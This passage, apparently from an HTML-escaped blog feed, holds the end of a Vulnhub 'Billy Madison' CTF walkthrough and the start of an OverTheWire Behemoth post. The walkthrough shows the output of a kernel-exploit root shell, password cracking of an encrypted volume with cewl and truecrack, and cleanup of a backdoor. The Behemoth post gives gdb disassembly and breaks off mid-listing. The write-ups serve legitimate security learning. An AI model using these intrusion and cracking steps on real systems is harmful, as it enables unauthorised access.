&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; TPACKET_V1 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; offset_to_first_pkt !&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0, race won &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
please &lt;span class=&quot;nb&quot;&gt;wait &lt;/span&gt;up to a few minutes &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;timer to be executed. &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;you ctrl-c now the kernel will hang. so dont &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;that.
closing socket and verifying.......
sysctl added!

stage 2 completed
binary executed by kernel, launching rootshell
&lt;span class=&quot;gp&quot;&gt;root@BM:~# &lt;/span&gt;whoami
root
root@BM:~#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, it's working! Now it's time to look for the last flag. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@BM:/home/billy# &lt;/span&gt;ls
billy-shampoo-animated.gif  billy-shampoo.jpg  billy-smartestmanalive.gif  pics
root@BM:/home/billy#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It's definitely not here, altough there's another portion of pictures. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/billy-madison/eric-unimpressed.jpg&quot; alt=&quot;Eric unimpressed&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let's keep looking. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@BM:/# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
&lt;span class=&quot;gp&quot;&gt;root@BM:/# &lt;/span&gt;ls -la
total 105
drwxr-xr-x  25 root root  4096 Mar 14 15:13 .
drwxr-xr-x  25 root root  4096 Mar 14 15:13 ..
drwxr-xr-x   2 root root  4096 Mar 14 15:11 bin
drwxr-xr-x   4 root root  1024 Mar 14 15:14 boot
drwxr-xr-x   2 root root  4096 Aug 18  2016 capture
drwxr-xr-x  20 root root  4220 Mar 14 15:06 dev
drwxr-xr-x 105 root root  4096 Mar 14 15:14 etc
drwxr-xr-x   6 root root  4096 Aug 20  2016 home
lrwxrwxrwx   1 root root    32 Mar 14 15:13 initrd.img -&amp;gt; boot/initrd.img-4.4.0-66-generic
lrwxrwxrwx   1 root root    32 Aug 30  2016 initrd.img.old -&amp;gt; boot/initrd.img-4.4.0-36-generic
drwxr-xr-x  23 root root  4096 Aug 16  2016 lib
drwxr-xr-x   2 root root  4096 Aug  5  2016 lib64
-rw-r--r--   1 root root   520 Aug 20  2016 log.txt
drwx------   2 root root 16384 Aug  5  2016 lost+found
drwxr-xr-x   3 root root  4096 Aug  5  2016 media
drwxr-xr-x   2 root root  4096 Jul 19  2016 mnt
drwxr-xr-x  11 root root  4096 Aug 22  2016 opt
drwx------   2 root root  4096 Aug 29  2016 PRIVATE
dr-xr-xr-x 228 root root     0 Mar 14 15:06 proc
drwx------   8 root root  4096 Mar 14 15:06 root
drwxr-xr-x  25 root root  1060 Mar 14 15:17 run
drwxr-xr-x   2 root root 12288 Mar 14 15:11 sbin
drwxr-xr-x   2 root root  4096 Jun 29  2016 snap
drwxr-xr-x   2 root root  4096 Jul 19  2016 srv
dr-xr-xr-x  13 root root     0 Mar 14 15:38 sys
drwxrwxrwt   9 root root  4096 Mar 14 15:40 tmp
drwxr-xr-x  10 root root  4096 Aug  5  2016 usr
drwxr-xr-x  14 root root  4096 Aug 11  2016 var
lrwxrwxrwx   1 root root    29 Mar 14 15:13 vmlinuz -&amp;gt; boot/vmlinuz-4.4.0-66-generic
lrwxrwxrwx   1 root root    29 Aug 30  2016 vmlinuz.old -&amp;gt; boot/vmlinuz-4.4.0-36-generic
&lt;span class=&quot;gp&quot;&gt;root@BM:/# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;PRIVATE
&lt;span class=&quot;gp&quot;&gt;root@BM:/PRIVATE# &lt;/span&gt;ls -la
total 1036
drwx------  2 root  root     4096 Aug 29  2016 .
drwxr-xr-x 25 root  root     4096 Mar 14 15:13 ..
-rw-rw-r--  1 billy billy 1048576 Aug 21  2016 BowelMovement
-rw-r--r--  1 root  root      221 Aug 29  2016 hint.txt
&lt;span class=&quot;gp&quot;&gt;root@BM:/PRIVATE# &lt;/span&gt;cat hint.txt
Heh, I called the file BowelMovement because it has the same initials as
Billy Madison.  That truely cracks me up!  LOLOLOL!

I always forget the password, but it&lt;span class=&quot;s1&quot;&gt;'s here:

https://en.wikipedia.org/wiki/Billy_Madison

-EG&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2&gt;Cracking the flag&lt;/h2&gt;

&lt;p&gt;Hmm, it seems that we have to create another &lt;b&gt;wordlist&lt;/b&gt; from Wikipedia entry. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;cewl --depth 0 -w wiki.list https://en.wikipedia.org/wiki/Billy_Madison
CeWL 5.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Some Chaos&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Robin Wood &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;robin@digi.ninja&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://digi.ninja/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We can now try to crack it using &lt;b&gt;truecrack&lt;/b&gt; tool. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;truecrack -w wiki.list -t BowelMovement
TrueCrack v3.0
Website: http://code.google.com/p/truecrack
Contact us: infotruecrack@gmail.com
Found password:        &lt;span class=&quot;s2&quot;&gt;&quot;execrable&quot;&lt;/span&gt;
Password length:    &lt;span class=&quot;s2&quot;&gt;&quot;10&quot;&lt;/span&gt;
Total computations:    &lt;span class=&quot;s2&quot;&gt;&quot;603&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another victory! We can now mount it using &lt;b&gt;veracrypt&lt;/b&gt;, and see if there are final flags. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;veracrypt -tc BowelMovement billy-vera
Enter password &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; /root/BowelMovement:
Enter keyfile &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;none]:
Protect hidden volume &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;any&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Yes/n&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;No&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;No]:
&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;billy-vera
&lt;span class=&quot;gp&quot;&gt;root@kali:~/billy-vera# &lt;/span&gt;find . -ls
        1     16 drwx------   3 root     root        16384 Dec 31  1969 .
       65      1 -rwx------   1 root     root         1000 Aug 21 10:22 ./secret.zip
       66      1 drwx------   2 root     root          512 Aug 21 10:39 ./&lt;span class=&quot;nv&quot;&gt;$RECYCLE&lt;/span&gt;.BIN
       68      1 -rwx------   1 root     root          129 Aug 21 10:39 ./&lt;span class=&quot;nv&quot;&gt;$RECYCLE&lt;/span&gt;.BIN/desktop.ini
&lt;span class=&quot;gp&quot;&gt;root@kali:~/billy-vera# &lt;/span&gt;unzip secret.zip
Archive:  secret.zip
inflating: Billy_Madison_12th_Grade_Final_Project.doc  
inflating: THE-END.txt             
&lt;span class=&quot;gp&quot;&gt;root@kali:~/billy-vera# &lt;/span&gt;cat THE-END.txt
Congratulations!

If you&lt;span class=&quot;s1&quot;&gt;'re reading this, you win!

I hope you had fun.  I had an absolute blast putting this together.

I'&lt;/span&gt;d love to have your feedback on the box - or at least know you pwned it!

Please feel free to shoot me a tweet or email &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7ms@7ms.us&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and &lt;span class=&quot;nb&quot;&gt;let &lt;/span&gt;me know with
the subject line: &lt;span class=&quot;s2&quot;&gt;&quot;Stop looking at me swan!&quot;&lt;/span&gt;

Thanks much,

Brian Johnson
7 Minute Security
www.7ms.us&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We did it, what a great journey! Lastly, let's view Billy's assignment. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Billy Madison
Final Project
Knibb High



                                       The Industrial Revolution

The Industrial Revolution to me is just like a story I know called &lt;span class=&quot;s2&quot;&gt;&quot;The Puppy Who Lost His Way.&quot;&lt;/span&gt;
The world was changing, and the puppy was getting... bigger.

So, you see, the puppy was like industry. In that, they were both lost &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the woods.
And nobody, especially the little boy - &lt;span class=&quot;s2&quot;&gt;&quot;society&quot;&lt;/span&gt; - knew where to find &lt;span class=&quot;s1&quot;&gt;'em.
Except that the puppy was a dog.
But the industry, my friends, that was a revolution.

KNIBB HIGH FOOTBALL RULES!!!!!

https://www.youtube.com/watch?v=BlPw6MKvvIc

-BM&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2&gt;Cleanup&lt;/h2&gt;

&lt;p&gt;Our task was to also undo Eric's changes. Firstly let's disable &lt;b&gt;ssh&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@BM:~# &lt;/span&gt;update-rc.d ssh disable
insserv: warning: current start runlevel&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;empty&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; of script &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;ssh&lt;span class=&quot;s1&quot;&gt;' overrides LSB defaults (2 3 4 5).
insserv: warning: current stop runlevel(s) (2 3 4 5) of script `ssh'&lt;/span&gt; overrides LSB defaults &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;empty&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We can also terminate the service with &lt;b&gt;service ssh stop&lt;/b&gt;.&lt;/p&gt;

&lt;p&gt;We will also have to disable the backdoor, which is ssh service showing up after receiving email with certain phrase. We can do this by removing an entry from &lt;b&gt;crontab&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;*/1 * * * * /root/ssh/canyoussh.sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We also have to delete eric's account. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@BM:~# &lt;/span&gt;userdel eric&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now let's disable port knocking sequence, which can be done by editing &lt;b&gt;/etc/knockd.conf&lt;/b&gt; file, then delete all files from web root directory and lastly change passwords to all of the accounts. &lt;/p&gt;

&lt;p&gt;In addition, I've found that interesting binary at &lt;b&gt;/usr/local/share/sgml/donpcgd&lt;/b&gt;, which possibly is another way to gain root. We will have to delete it. &lt;/p&gt;

&lt;h1&gt;Last words&lt;/h1&gt;

&lt;p&gt;It was great fun to participate in this Vulnhub machine. Much thanks to &lt;a href=&quot;https://twitter.com/7MinSec&quot;&gt;&lt;b&gt;Brian Johnson&lt;/b&gt;&lt;/a&gt; for creating this challenge and to &lt;b&gt;Yodak#2187&lt;/b&gt; for bringing up some ideas. I'm looking forward to try more machines and root them all! &lt;/p&gt;

&lt;p&gt;Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Vulnhub" /><summary type="html">Introduction</summary></entry><entry><title type="html">Overthewire.org - Behemoth 0 -&amp;gt; 1</title><link href="http://localhost:4000/overthewire.org-behemoth-1/" rel="alternate" type="text/html" title="Overthewire.org - Behemoth 0 -&gt; 1" /><published>2017-03-12T00:00:00+00:00</published><updated>2017-03-12T00:00:00+00:00</updated><id>http://localhost:4000/overthewire.org-behemoth-1</id><content type="html" xml:base="http://localhost:4000/overthewire.org-behemoth-1/">&lt;h1&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Today we're going to attack another reverse engineering challenge, this time from the &lt;b&gt;Behemoth&lt;/b&gt; series. &lt;/p&gt;

&lt;p&gt;&lt;i&gt;This wargame deals with a lot of regular vulnerabilities found commonly 'out
in the wild'. While the game makes no attempts at emulating a real environment
it will teach you how to exploit several of the most common coding mistakes
including buffer overflows, race conditions and privilege escalation.&lt;/i&gt;&lt;/p&gt;

&lt;p&gt;Sounds fun, so let's jump straight into the unknown! &lt;/p&gt;

&lt;h1&gt;Challenge&lt;/h1&gt;

&lt;p&gt;This time, we are given only a binary file, so no more viewing the source code. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;behemoth0@melinda:~$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /behemoth/
&lt;span class=&quot;gp&quot;&gt;behemoth0@melinda:/behemoth$ &lt;/span&gt;./behemoth0
Password: password
Access denied..&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We have to somehow get the password which may result in spawning a shell. Our best friend - &lt;b&gt;gdb&lt;/b&gt; can help us with getting some better information about how we should approach this challenge.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;behemoth0@melinda:/behemoth$ &lt;/span&gt;gdb ./behemoth0
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disas main&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This code looks really interesting. Most of the functions are known from C, but what is &lt;b&gt;memfrob&lt;/b&gt;? &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;Dump&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;assembler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x080485a2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ebp&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x080485a3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ebp&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x080485a5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;and&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xfffffff0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x080485a8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;sub&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x080485ab&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x080485b1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x080485b5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;xor&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x080485b7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;movl&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x475e4b4f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x080485bf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;movl&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x45425953&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x080485c7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;37&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;movl&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x595e58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x27&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x080485cf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;movl&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8048720&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x080485d7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;movl&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8048738&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x080485df&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;movl&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x804874d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x080485e7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;movl&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8048761&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;mh&quot;&gt;0x080485ee&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;:&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;   &lt;span class=&quot;mh&quot;&gt;0x8048400&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
